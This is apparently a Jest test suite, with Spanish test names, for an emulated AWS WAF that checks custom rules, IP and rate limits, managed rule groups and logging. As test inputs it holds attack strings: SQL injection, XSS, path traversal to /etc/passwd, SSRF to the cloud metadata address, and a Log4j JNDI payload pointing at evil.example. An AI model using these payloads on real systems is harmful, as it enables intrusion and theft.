import { fetchFromInternet } from '../web';
import { mkEnv, type TestEnv } from './helpers';

const lbOf = async (e: TestEnv) => (await e.json('elbv2 describe-load-balancers --names web')).LoadBalancers[0] as { LoadBalancerArn: string; DNSName: string };

const vis = (m: string) => `SampledRequestsEnabled=true,CloudWatchMetricsEnabled=true,MetricName=${m}`;

async function setup(rules: unknown[] = [], opts: { def?: string; associate?: boolean } = {}) {
  const e = mkEnv({ scenario: 'cont-ecs' });
  const lb = await lbOf(e);
  e.write('rules.json', JSON.stringify(rules));
  const r = await e.json(`wafv2 create-web-acl --name tienda --scope REGIONAL --default-action ${opts.def ?? 'Allow={}'} --rules file://rules.json --visibility-config ${vis('tienda')}`);
  const acl = r.Summary as { Id: string; ARN: string; LockToken: string };
  if (opts.associate !== false) await e.run(`wafv2 associate-web-acl --web-acl-arn ${acl.ARN} --resource-arn ${lb.LoadBalancerArn}`);
  const get = (path = '/', o: { srcIp?: string; headers?: Record<string, string>; method?: string; body?: string } = {}) => fetchFromInternet(e.acct, `http://${lb.DNSName}${path}`, o);
  return { e, lb, acl, get };
}

const rule = (name: string, priority: number, statement: unknown, action = 'Block') => ({ Name: name, Priority: priority, Statement: statement, Action: { [action]: {} }, VisibilityConfig: { SampledRequestsEnabled: true, CloudWatchMetricsEnabled: true, MetricName: name } });

describe('WAF: reglas propias', () => {
  test('sin ACL todo pasa; con una regla que bloquea una ruta, el balanceador contesta 403 antes de llegar a la aplicación', async () => {
    const { e, lb, acl, get } = await setup([rule('NoAdmin', 1, { ByteMatchStatement: { SearchString: '/admin', FieldToMatch: { UriPath: {} }, TextTransformations: [{ Priority: 0, Type: 'NONE' }], PositionalConstraint: 'STARTS_WITH' } })], { associate: false });
    expect(get('/admin').status).not.toBe(403);
    expect((await e.run(`wafv2 associate-web-acl --web-acl-arn ${acl.ARN} --resource-arn ${lb.LoadBalancerArn}`)).stderr).toBe('');
    const blocked = get('/admin/usuarios');
    expect(blocked).toMatchObject({ ok: true, status: 403 });
    expect(blocked.body).toContain('403 Forbidden');
    expect(blocked.headers?.Server).toBe('awselb/2.0');
    expect(get('/tienda').status).not.toBe(403);
    // el balanceador sabe qué ACL lo protege
    const w = await e.json(`wafv2 get-web-acl-for-resource --resource-arn ${lb.LoadBalancerArn}`);
    expect(w.WebACL.Name).toBe('tienda');
    expect((await e.json(`wafv2 list-resources-for-web-acl --web-acl-arn ${acl.ARN}`)).ResourceArns).toEqual([lb.LoadBalancerArn]);
  });

  test('las reglas se evalúan por prioridad: una regla Allow anterior gana a un Block posterior; Count no decide', async () => {
    const m = (s: string, pos = 'STARTS_WITH') => ({ ByteMatchStatement: { SearchString: s, FieldToMatch: { UriPath: {} }, TextTransformations: [{ Priority: 0, Type: 'NONE' }], PositionalConstraint: pos } });
    const { get, e, acl } = await setup([rule('Contar', 0, m('/admin'), 'Count'), rule('Permitir', 1, m('/admin/health', 'EXACTLY'), 'Allow'), rule('Bloquear', 2, m('/admin'))]);
    expect(get('/admin/health').status).not.toBe(403);
    expect(get('/admin/x').status).toBe(403);
    // Count deja rastro en las métricas pero no cambia el resultado
    const m1 = await e.json(`cloudwatch list-metrics --namespace AWS/WAFV2`);
    const names = (m1.Metrics as { MetricName: string; Dimensions: { Name: string; Value: string }[] }[]).map((x) => x.MetricName + ':' + x.Dimensions.find((d) => d.Name === 'Rule')?.Value);
    expect(names).toEqual(expect.arrayContaining(['CountedRequests:Contar', 'BlockedRequests:Bloquear', 'BlockedRequests:ALL']));
    void acl;
  });

  test('la acción por defecto Block deja pasar solo lo que una regla permite', async () => {
    const { get } = await setup([rule('SoloInicio', 1, { ByteMatchStatement: { SearchString: '/', FieldToMatch: { UriPath: {} }, TextTransformations: [{ Priority: 0, Type: 'NONE' }], PositionalConstraint: 'EXACTLY' } }, 'Allow')], { def: 'Block={}' });
    expect(get('/').status).not.toBe(403);
    expect(get('/otra').status).toBe(403);
  });

  test('una respuesta de bloqueo personalizada: código, cabeceras y cuerpo definidos en la ACL', async () => {
    const e = mkEnv({ scenario: 'cont-ecs' });
    const lb = await lbOf(e);
    e.write('rules.json', JSON.stringify([{ Name: 'Lento', Priority: 1, Statement: { ByteMatchStatement: { SearchString: 'beta', FieldToMatch: { UriPath: {} }, TextTransformations: [{ Priority: 0, Type: 'NONE' }], PositionalConstraint: 'CONTAINS' } }, Action: { Block: { CustomResponse: { ResponseCode: 429, CustomResponseBodyKey: 'cuerpo', ResponseHeaders: [{ Name: 'x-motivo', Value: 'beta' }] } } }, VisibilityConfig: { SampledRequestsEnabled: false, CloudWatchMetricsEnabled: false, MetricName: 'Lento' } }]));
    e.write('bodies.json', JSON.stringify({ cuerpo: { ContentType: 'APPLICATION_JSON', Content: '{"error":"vuelve más tarde"}' } }));
    const r = await e.run(`wafv2 create-web-acl --name t --scope REGIONAL --default-action Allow={} --rules file://rules.json --custom-response-bodies file://bodies.json --visibility-config ${vis('t')}`);
    expect(r.stderr).toBe('');
    const arn = JSON.parse(r.stdout).Summary.ARN;
    await e.run(`wafv2 associate-web-acl --web-acl-arn ${arn} --resource-arn ${lb.LoadBalancerArn}`);
    const res = fetchFromInternet(e.acct, `http://${lb.DNSName}/beta`);
    expect(res).toMatchObject({ status: 429, type: 'application/json' });
    expect(res.body).toContain('vuelve más tarde');
    expect(res.headers?.['x-motivo']).toBe('beta');
  });

  test('las transformaciones cambian lo que se compara: LOWERCASE hace falta para atrapar mayúsculas', async () => {
    const mk = (tf: string) => ({ ByteMatchStatement: { SearchString: 'admin', FieldToMatch: { UriPath: {} }, TextTransformations: [{ Priority: 0, Type: tf }], PositionalConstraint: 'CONTAINS' } });
    const a = await setup([rule('R', 1, mk('NONE'))]);
    expect(a.get('/ADMIN').status).not.toBe(403);
    const b = await setup([rule('R', 1, mk('LOWERCASE'))]);
    expect(b.get('/ADMIN').status).toBe(403);
    // la CLI v2 pide el texto en base64: también vale
    const c = await setup([rule('R', 1, { ByteMatchStatement: { SearchString: 'L2FkbWlu', FieldToMatch: { UriPath: {} }, TextTransformations: [{ Priority: 0, Type: 'NONE' }], PositionalConstraint: 'STARTS_WITH' } })]);
    expect(c.get('/admin').status).toBe(403);
  });

  test('SQLi y XSS en la consulta, usando los detectores propios con URL_DECODE', async () => {
    const { get } = await setup([rule('Sqli', 1, { SqliMatchStatement: { FieldToMatch: { QueryString: {} }, TextTransformations: [{ Priority: 0, Type: 'URL_DECODE' }] } }), rule('Xss', 2, { XssMatchStatement: { FieldToMatch: { QueryString: {} }, TextTransformations: [{ Priority: 0, Type: 'URL_DECODE' }] } })]);
    expect(get("/buscar?q=zapatos").status).not.toBe(403);
    expect(get("/buscar?q=1%27%20OR%20%271%27%3D%271").status).toBe(403);
    expect(get('/buscar?q=%3Cscript%3Ealert(1)%3C/script%3E').status).toBe(403);
  });

  test('regla por tamaño del cuerpo y por método', async () => {
    const { get } = await setup([rule('Grande', 1, { SizeConstraintStatement: { FieldToMatch: { Body: {} }, ComparisonOperator: 'GT', Size: 20, TextTransformations: [{ Priority: 0, Type: 'NONE' }] } }), rule('SoloLeer', 2, { ByteMatchStatement: { SearchString: 'DELETE', FieldToMatch: { Method: {} }, TextTransformations: [{ Priority: 0, Type: 'NONE' }], PositionalConstraint: 'EXACTLY' } })]);
    expect(get('/', { method: 'POST', body: 'pequeño' }).status).not.toBe(403);
    expect(get('/', { method: 'POST', body: 'x'.repeat(50) }).status).toBe(403);
    expect(get('/', { method: 'DELETE' }).status).toBe(403);
  });
});

describe('WAF: IP, país y límite de tasa', () => {
  test('conjunto de IP: hay que poner la máscara /32; actualizar exige el LockToken; no se borra mientras una regla lo usa', async () => {
    const e = mkEnv({ scenario: 'cont-ecs' });
    expect((await e.run('wafv2 create-ip-set --name malos --scope REGIONAL --ip-address-version IPV4 --addresses 198.51.100.7')).stderr).toContain('WAFInvalidParameterException');
    const s = (await e.json('wafv2 create-ip-set --name malos --scope REGIONAL --ip-address-version IPV4 --addresses 198.51.100.7/32')).Summary as { Id: string; ARN: string; LockToken: string };
    expect((await e.run('wafv2 create-ip-set --name malos --scope REGIONAL --ip-address-version IPV4 --addresses 10.0.0.0/8')).stderr).toContain('WAFDuplicateItemException');
    expect((await e.run(`wafv2 update-ip-set --name malos --scope REGIONAL --id ${s.Id} --addresses 198.51.100.7/32 192.0.2.0/24 --lock-token 00000000-0000-0000-0000-000000000000`)).stderr).toContain('WAFOptimisticLockException');
    const up = await e.json(`wafv2 update-ip-set --name malos --scope REGIONAL --id ${s.Id} --addresses 198.51.100.7/32 192.0.2.0/24 --lock-token ${s.LockToken}`);
    expect(up.NextLockToken).not.toBe(s.LockToken);
    expect((await e.json(`wafv2 get-ip-set --name malos --scope REGIONAL --id ${s.Id}`)).IPSet.Addresses).toEqual(['198.51.100.7/32', '192.0.2.0/24']);
    e.write('r.json', JSON.stringify([rule('Lista', 1, { IPSetReferenceStatement: { ARN: s.ARN } })]));
    await e.run(`wafv2 create-web-acl --name t --scope REGIONAL --default-action Allow={} --rules file://r.json --visibility-config ${vis('t')}`);
    expect((await e.run(`wafv2 delete-ip-set --name malos --scope REGIONAL --id ${s.Id} --lock-token ${up.NextLockToken}`)).stderr).toContain('WAFAssociatedItemException');
  });

  test('bloquear por IP de origen y por país', async () => {
    const e = mkEnv({ scenario: 'cont-ecs' });
    const lb = await lbOf(e);
    const ip = (await e.json('wafv2 create-ip-set --name malos --scope REGIONAL --ip-address-version IPV4 --addresses 198.51.100.7/32')).Summary as { ARN: string };
    e.write('r.json', JSON.stringify([rule('Lista', 1, { IPSetReferenceStatement: { ARN: ip.ARN } }), rule('Pais', 2, { GeoMatchStatement: { CountryCodes: ['JP', 'BR'] } })]));
    const acl = (await e.json(`wafv2 create-web-acl --name t --scope REGIONAL --default-action Allow={} --rules file://r.json --visibility-config ${vis('t')}`)).Summary as { ARN: string };
    await e.run(`wafv2 associate-web-acl --web-acl-arn ${acl.ARN} --resource-arn ${lb.LoadBalancerArn}`);
    const from = (srcIp?: string) => fetchFromInternet(e.acct, `http://${lb.DNSName}/`, { srcIp }).status;
    expect(from()).not.toBe(403);
    expect(from('198.51.100.7')).toBe(403);
    expect(from('198.51.100.8')).not.toBe(403);
    expect(from('192.0.2.10')).toBe(403);
    expect(from('100.64.1.1')).toBe(403);
  });

  test('regla por tasa: tras el límite en la ventana, esa IP recibe 403 aunque otras IP sigan pasando', async () => {
    const { get, e, acl } = await setup([rule('Limite', 1, { RateBasedStatement: { Limit: 10, AggregateKeyType: 'IP', EvaluationWindowSec: 60 } })]);
    const first = Array.from({ length: 10 }, () => get('/').status);
    expect(first.every((s) => s !== 403)).toBe(true);
    expect(get('/').status).toBe(403);
    expect(get('/').status).toBe(403);
    // otra IP no se ve afectada
    expect(get('/', { srcIp: '198.51.100.9' }).status).not.toBe(403);
    // pasada la ventana, vuelve a pasar
    e.acct.clock += 70_000;
    expect(get('/').status).not.toBe(403);
    void acl;
  });

  test('límite de tasa con ámbito: solo cuentan las peticiones a /login', async () => {
    const { get } = await setup([rule('Login', 1, { RateBasedStatement: { Limit: 10, AggregateKeyType: 'IP', EvaluationWindowSec: 60, ScopeDownStatement: { ByteMatchStatement: { SearchString: '/login', FieldToMatch: { UriPath: {} }, TextTransformations: [{ Priority: 0, Type: 'NONE' }], PositionalConstraint: 'STARTS_WITH' } } } })]);
    for (let i = 0; i < 40; i++) expect(get('/').status).not.toBe(403);
    const r = Array.from({ length: 15 }, () => get('/login').status);
    expect(r.slice(0, 10).every((s) => s !== 403)).toBe(true);
    expect(r.slice(10).every((s) => s === 403)).toBe(true);
    expect(get('/').status).not.toBe(403);
  });
});

describe('WAF: grupos gestionados', () => {
  const group = (name: string, extra: Record<string, unknown> = {}, over: Record<string, unknown> = { None: {} }) => ({ Name: name, Priority: 1, Statement: { ManagedRuleGroupStatement: { VendorName: 'AWS', Name: name, ...extra } }, OverrideAction: over, VisibilityConfig: { SampledRequestsEnabled: true, CloudWatchMetricsEnabled: true, MetricName: name } });

  test('CommonRuleSet bloquea peticiones sin User-Agent, bots y rutas relativas; SQLiRuleSet, inyecciones', async () => {
    const { get } = await setup([group('AWSManagedRulesCommonRuleSet'), { ...group('AWSManagedRulesSQLiRuleSet'), Priority: 2 }]);
    expect(get('/').status).not.toBe(403);
    expect(get('/', { headers: { 'user-agent': '' } }).status).toBe(403);
    expect(get('/', { headers: { 'user-agent': 'sqlmap/1.7' } }).status).toBe(403);
    expect(get('/ver?f=../../etc/passwd').status).toBe(403);
    expect(get('/ver?url=http://169.254.169.254/latest/meta-data/').status).toBe(403);
    expect(get('/p?id=1%20UNION%20SELECT%20password%20FROM%20users').status).toBe(403);
    expect(get('/backup.sql').status).toBe(403);
    expect(get('/', { method: 'POST', body: 'a'.repeat(9000) }).status).toBe(403);
  });

  test('ExcludedRules y RuleActionOverrides dejan pasar la regla concreta que da falsos positivos', async () => {
    const big = { method: 'POST', body: 'a'.repeat(9000) };
    const a = await setup([group('AWSManagedRulesCommonRuleSet', { ExcludedRules: [{ Name: 'SizeRestrictions_BODY' }] })]);
    expect(a.get('/', big).status).not.toBe(403);
    expect(a.get('/ver?f=../etc/passwd').status).toBe(403);
    const b = await setup([group('AWSManagedRulesCommonRuleSet', { RuleActionOverrides: [{ Name: 'SizeRestrictions_BODY', ActionToUse: { Count: {} } }] })]);
    expect(b.get('/', big).status).not.toBe(403);
  });

  test('OverrideAction Count (modo de prueba): ninguna regla del grupo bloquea, pero quedan registradas', async () => {
    const { get, e } = await setup([group('AWSManagedRulesSQLiRuleSet', {}, { Count: {} })]);
    expect(get('/p?id=1%20UNION%20SELECT%20x%20FROM%20y').status).not.toBe(403);
    const m = await e.json('cloudwatch list-metrics --namespace AWS/WAFV2');
    expect((m.Metrics as { MetricName: string }[]).some((x) => x.MetricName === 'CountedRequests')).toBe(true);
  });

  test('reputación de IP, rutas de administración y Log4j', async () => {
    const { get } = await setup([group('AWSManagedRulesAmazonIpReputationList'), { ...group('AWSManagedRulesAdminProtectionRuleSet'), Priority: 2 }, { ...group('AWSManagedRulesKnownBadInputsRuleSet'), Priority: 3 }]);
    expect(get('/', { srcIp: '198.51.100.66' }).status).toBe(403);
    expect(get('/phpmyadmin/index.php').status).toBe(403);
    expect(get('/', { headers: { 'x-api-version': '${jndi:ldap://evil.example/a}' } }).status).toBe(403);
  });

  test('describe-managed-rule-group y list-available-managed-rule-groups', async () => {
    const e = mkEnv();
    const l = await e.json('wafv2 list-available-managed-rule-groups --scope REGIONAL');
    expect((l.ManagedRuleGroups as { Name: string }[]).map((g) => g.Name)).toEqual(expect.arrayContaining(['AWSManagedRulesCommonRuleSet', 'AWSManagedRulesSQLiRuleSet']));
    const d = await e.json('wafv2 describe-managed-rule-group --vendor-name AWS --name AWSManagedRulesCommonRuleSet --scope REGIONAL');
    expect(d.Capacity).toBe(700);
    expect((d.Rules as { Name: string }[]).some((r) => r.Name === 'SizeRestrictions_BODY')).toBe(true);
    expect((await e.run('wafv2 describe-managed-rule-group --vendor-name AWS --name Inventada --scope REGIONAL')).stderr).toContain('WAFNonexistentItemException');
  });
});

describe('WAF: ACL, validaciones y ciclo de vida', () => {
  test('errores frecuentes al crear', async () => {
    const e = mkEnv({ scenario: 'cont-ecs' });
    const mk = (extra: string, rules = '[]') => {
      e.write('r.json', rules);
      return e.run(`wafv2 create-web-acl --name x --scope ${extra} --default-action Allow={} --rules file://r.json --visibility-config ${vis('x')}`);
    };
    expect((await mk('GLOBAL')).stderr).toContain('WAFInvalidParameterException');
    const dup = JSON.stringify([rule('A', 1, { GeoMatchStatement: { CountryCodes: ['ES'] } }), rule('B', 1, { GeoMatchStatement: { CountryCodes: ['FR'] } })]);
    expect((await mk('REGIONAL', dup)).stderr).toContain('prior');
    expect((await mk('REGIONAL', JSON.stringify([{ Name: 'A', Priority: 1, Statement: { GeoMatchStatement: { CountryCodes: ['ES'] } }, VisibilityConfig: { SampledRequestsEnabled: true, CloudWatchMetricsEnabled: true, MetricName: 'A' } }]))).stderr).toContain('Action');
    expect((await mk('REGIONAL', JSON.stringify([{ Name: 'G', Priority: 1, Statement: { ManagedRuleGroupStatement: { VendorName: 'AWS', Name: 'AWSManagedRulesSQLiRuleSet' } }, Action: { Block: {} }, VisibilityConfig: { SampledRequestsEnabled: true, CloudWatchMetricsEnabled: true, MetricName: 'G' } }]))).stderr).toContain('OverrideAction');
    expect((await mk('REGIONAL', JSON.stringify([rule('Ip', 1, { IPSetReferenceStatement: { ARN: 'arn:aws:wafv2:us-east-1:123456789012:regional/ipset/nada/abc' } })]))).stderr).toContain('WAFNonexistentItemException');
    expect((await mk('REGIONAL', JSON.stringify([rule('Rate', 1, { RateBasedStatement: { Limit: 5, AggregateKeyType: 'IP' } })]))).stderr).toContain('rate limit');
    expect((await mk('REGIONAL')).stderr).toBe('');
    expect((await mk('REGIONAL')).stderr).toContain('WAFDuplicateItemException');
    const e2 = mkEnv({ region: 'eu-west-1' });
    expect((await e2.run(`wafv2 create-web-acl --name x --scope CLOUDFRONT --default-action Allow={} --visibility-config ${vis('x')}`)).stderr).toContain('SCOPE_VALUE');
  });

  test('update-web-acl exige el LockToken y sustituye todo; delete falla mientras está asociada', async () => {
    const { e, acl, lb } = await setup([rule('Geo', 1, { GeoMatchStatement: { CountryCodes: ['JP'] } })]);
    e.write('r2.json', JSON.stringify([rule('Geo', 1, { GeoMatchStatement: { CountryCodes: ['BR'] } })]));
    const cmd = (t: string) => `wafv2 update-web-acl --name tienda --scope REGIONAL --id ${acl.Id} --default-action Allow={} --rules file://r2.json --visibility-config ${vis('tienda')} --lock-token ${t}`;
    expect((await e.run(cmd(acl.LockToken + 'x'))).stderr).toContain('WAFOptimisticLockException');
    const up = await e.json(cmd(acl.LockToken));
    expect((await e.run(cmd(acl.LockToken))).stderr).toContain('WAFOptimisticLockException');
    const g = await e.json(`wafv2 get-web-acl --name tienda --scope REGIONAL --id ${acl.Id}`);
    expect(g.WebACL.Rules[0].Statement.GeoMatchStatement.CountryCodes).toEqual(['BR']);
    expect(g.LockToken).toBe(up.NextLockToken);
    expect((await e.run(`wafv2 delete-web-acl --name tienda --scope REGIONAL --id ${acl.Id} --lock-token ${g.LockToken}`)).stderr).toContain('WAFAssociatedItemException');
    await e.run(`wafv2 disassociate-web-acl --resource-arn ${lb.LoadBalancerArn}`);
    expect((await e.run(`wafv2 delete-web-acl --name tienda --scope REGIONAL --id ${acl.Id} --lock-token ${g.LockToken}`)).stderr).toBe('');
    expect((await e.json('wafv2 list-web-acls --scope REGIONAL')).WebACLs).toHaveLength(0);
  });

  test('check-capacity suma las WCU y el tope de la ACL es 5000', async () => {
    const e = mkEnv();
    e.write('r.json', JSON.stringify([rule('G', 1, { GeoMatchStatement: { CountryCodes: ['ES'] } }), { ...rule('X', 2, { XssMatchStatement: { FieldToMatch: { QueryString: {} }, TextTransformations: [{ Priority: 0, Type: 'URL_DECODE' }] } }) }]));
    expect((await e.json('wafv2 check-capacity --scope REGIONAL --rules file://r.json')).Capacity).toBe(1 + 40 + 10);
    const big = ['AWSManagedRulesCommonRuleSet', 'AWSManagedRulesSQLiRuleSet', 'AWSManagedRulesKnownBadInputsRuleSet'].map((n, i) => ({ Name: n, Priority: i, Statement: { ManagedRuleGroupStatement: { VendorName: 'AWS', Name: n } }, OverrideAction: { None: {} }, VisibilityConfig: { SampledRequestsEnabled: true, CloudWatchMetricsEnabled: true, MetricName: n } }));
    e.write('b.json', JSON.stringify(big));
    expect((await e.json('wafv2 check-capacity --scope REGIONAL --rules file://b.json')).Capacity).toBe(1100);
  });

  test('asociar exige el permiso de WAF y el de ELB; solo ALB, no NLB', async () => {
    const { e, acl } = await setup([], { associate: false });
    expect((await e.run(`wafv2 associate-web-acl --web-acl-arn ${acl.ARN} --resource-arn arn:aws:elasticloadbalancing:us-east-1:123456789012:loadbalancer/net/x/abc`)).stderr).toContain('WAFInvalidParameterException');
    expect((await e.run(`wafv2 associate-web-acl --web-acl-arn ${acl.ARN} --resource-arn arn:aws:elasticloadbalancing:us-east-1:123456789012:loadbalancer/app/no-existe/abc`)).stderr).toContain('WAFNonexistentItemException');
  });
});

describe('WAF: registros, métricas y muestras', () => {
  test('los registros llegan a un grupo aws-waf-logs-* con la regla que decidió y se pueden filtrar para guardar solo los bloqueos', async () => {
    const { e, acl, get } = await setup([rule('NoAdmin', 1, { ByteMatchStatement: { SearchString: '/admin', FieldToMatch: { UriPath: {} }, TextTransformations: [{ Priority: 0, Type: 'NONE' }], PositionalConstraint: 'STARTS_WITH' } })]);
    expect((await e.run(`wafv2 put-logging-configuration --logging-configuration ResourceArn=${acl.ARN},LogDestinationConfigs=arn:aws:logs:us-east-1:123456789012:log-group:aws-waf-logs-tienda`)).stderr).toContain('WAFNonexistentItemException');
    await e.run('logs create-log-group --log-group-name aws-waf-logs-tienda');
    expect((await e.run(`wafv2 put-logging-configuration --logging-configuration ResourceArn=${acl.ARN},LogDestinationConfigs=arn:aws:logs:us-east-1:123456789012:log-group:otro`)).stderr).toContain('WAFInvalidParameterException');
    const ok = await e.run(`wafv2 put-logging-configuration --logging-configuration ResourceArn=${acl.ARN},LogDestinationConfigs=arn:aws:logs:us-east-1:123456789012:log-group:aws-waf-logs-tienda`);
    expect(ok.stderr).toBe('');
    get('/');
    get('/admin');
    const ev = (await e.json('logs filter-log-events --log-group-name aws-waf-logs-tienda')).events as { message: string }[];
    expect(ev).toHaveLength(2);
    const blocked = JSON.parse(ev.find((x) => x.message.includes('"BLOCK"'))!.message);
    expect(blocked).toMatchObject({ action: 'BLOCK', terminatingRuleId: 'NoAdmin', httpSourceName: 'ALB', httpRequest: { clientIp: '203.0.113.25', country: 'ES', uri: '/admin' } });
    // solo guardar los bloqueos
    const flt = JSON.stringify({ ResourceArn: acl.ARN, LogDestinationConfigs: ['arn:aws:logs:us-east-1:123456789012:log-group:aws-waf-logs-tienda'], LoggingFilter: { DefaultBehavior: 'DROP', Filters: [{ Behavior: 'KEEP', Requirement: 'MEETS_ANY', Conditions: [{ ActionCondition: { Action: 'BLOCK' } }] }] } });
    e.write('l.json', flt);
    await e.run('wafv2 put-logging-configuration --logging-configuration file://l.json');
    get('/');
    get('/admin/2');
    expect(((await e.json('logs filter-log-events --log-group-name aws-waf-logs-tienda')).events as unknown[]).length).toBe(3);
  });

  test('get-sampled-requests devuelve lo que evaluó una regla, y las métricas de CloudWatch cuentan permitidas y bloqueadas', async () => {
    const { e, acl, get } = await setup([rule('NoAdmin', 1, { ByteMatchStatement: { SearchString: '/admin', FieldToMatch: { UriPath: {} }, TextTransformations: [{ Priority: 0, Type: 'NONE' }], PositionalConstraint: 'STARTS_WITH' } })]);
    get('/admin');
    get('/admin/x', { srcIp: '198.51.100.7' });
    get('/ok');
    const start = new Date(e.acct.clock - 3600_000).toISOString();
    const end = new Date(e.acct.clock + 60_000).toISOString();
    const s = await e.json(`wafv2 get-sampled-requests --web-acl-arn ${acl.ARN} --rule-metric-name NoAdmin --scope REGIONAL --time-window StartTime=${start},EndTime=${end} --max-items 100`);
    expect(s.SampledRequests).toHaveLength(2);
    expect(s.SampledRequests[0]).toMatchObject({ Action: 'BLOCK', Request: { ClientIP: '198.51.100.7', Country: 'US', Method: 'GET', URI: '/admin/x' } });
    const m = await e.json(`cloudwatch get-metric-statistics --namespace AWS/WAFV2 --metric-name BlockedRequests --dimensions Name=WebACL,Value=tienda Name=Rule,Value=ALL Name=Region,Value=us-east-1 --start-time ${start} --end-time ${end} --period 3600 --statistics Sum`);
    expect((m.Datapoints as { Sum: number }[]).reduce((n, d) => n + d.Sum, 0)).toBe(2);
  });
});

describe('WAF en CloudFront y ráfagas de carga', () => {
  test('una ACL de ámbito CLOUDFRONT (us-east-1) protege la distribución desde el borde; update-distribution sin WebACLId la desprotege', async () => {
    const e = mkEnv({ scenario: 'cont-ecs' });
    e.write('r.json', JSON.stringify([rule('NoAdmin', 1, { ByteMatchStatement: { SearchString: '/admin', FieldToMatch: { UriPath: {} }, TextTransformations: [{ Priority: 0, Type: 'NONE' }], PositionalConstraint: 'STARTS_WITH' } })]));
    const acl = (await e.json(`wafv2 create-web-acl --name edge --scope CLOUDFRONT --default-action Allow={} --rules file://r.json --visibility-config ${vis('edge')} --region us-east-1`)).Summary as { ARN: string };
    expect(acl.ARN).toContain(':global/webacl/edge/');
    const lb = await lbOf(e);
    e.write('cf.json', JSON.stringify({ CallerReference: 'x', Comment: 'web', Enabled: true, WebACLId: acl.ARN, Origins: { Quantity: 1, Items: [{ Id: 'alb', DomainName: lb.DNSName, CustomOriginConfig: { HTTPPort: 80, HTTPSPort: 443, OriginProtocolPolicy: 'http-only' } }] }, DefaultCacheBehavior: { TargetOriginId: 'alb', ViewerProtocolPolicy: 'allow-all' } }));
    const d = (await e.json('cloudfront create-distribution --distribution-config file://cf.json')).Distribution as { Id: string; DomainName: string };
    e.acct.clock += 30 * 60_000;
    const r = fetchFromInternet(e.acct, `http://${d.DomainName}/admin`);
    expect(r.status).toBe(403);
    expect(r.headers?.['X-Cache']).toBe('Error from cloudfront');
    expect(fetchFromInternet(e.acct, `http://${d.DomainName}/`).status).not.toBe(403);
    expect((await e.json(`cloudfront list-distributions-by-web-acl-id --web-acl-id ${acl.ARN}`)).DistributionList.Quantity).toBe(1);
    // una ACL regional no vale para CloudFront
    const reg = (await e.json(`wafv2 create-web-acl --name reg --scope REGIONAL --default-action Allow={} --visibility-config ${vis('reg')}`)).Summary as { ARN: string };
    e.write('cf2.json', JSON.stringify({ CallerReference: 'y', Comment: 'otra', Enabled: true, WebACLId: reg.ARN, Origins: { Quantity: 1, Items: [{ Id: 'alb', DomainName: lb.DNSName }] }, DefaultCacheBehavior: { TargetOriginId: 'alb', ViewerProtocolPolicy: 'allow-all' } }));
    expect((await e.run('cloudfront create-distribution --distribution-config file://cf2.json')).stderr).toContain('InvalidWebACLId');
  });
});
